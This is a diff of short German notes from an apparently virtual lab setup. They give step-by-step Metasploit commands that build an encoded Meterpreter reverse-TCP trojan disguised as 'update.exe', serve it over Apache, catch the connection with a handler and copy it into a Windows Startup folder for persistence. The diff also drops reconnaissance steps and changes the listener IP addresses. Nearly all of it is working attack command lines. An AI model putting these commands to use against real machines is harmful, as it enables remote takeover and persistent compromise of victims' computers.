@@ -1,25 +1,10 @@
-1. arp_sweep
-2. port scanner
-3. Angriff
-
-
-metasploit reverse_tcp
-
-/var/www/html/update.exe output für zugriff per apache
-
-exploit wartet auf verbindung durch Zielhost, erfolgt nach ausführung der update.exe
-
-Autostart Trojaner
-upload /var/www/html/update.exe "c:\\users\\vagrant\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-
-
-1. msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=8080 -f exe --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe
+1. msfvenom --payload windows/meterpreter/reverse_tcp LHOST=172.28.128.4 LPORT=8080 -f exe --platform windows --arch x86 -e x86/shikata_ga_nai -i 10 > /var/www/html/update.exe
 
 2. use exploit/multi/handler
 
 3. set payload windows/meterpreter/reverse_tcp
 
-4. set LHOST 192.168.56.101
+4. set LHOST 172.28.128.3
 
 5. set LPORT 8080
 
@@ -27,4 +12,4 @@ upload /var/www/html/update.exe "c:\\users\\vagrant\\AppData\\Roaming\\Microsoft
 
 7. exploit
 
-8. update.exe auf Zielhost ausführen
+8. upload /var/www/html/update.exe "c:\\users\\vagrant\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
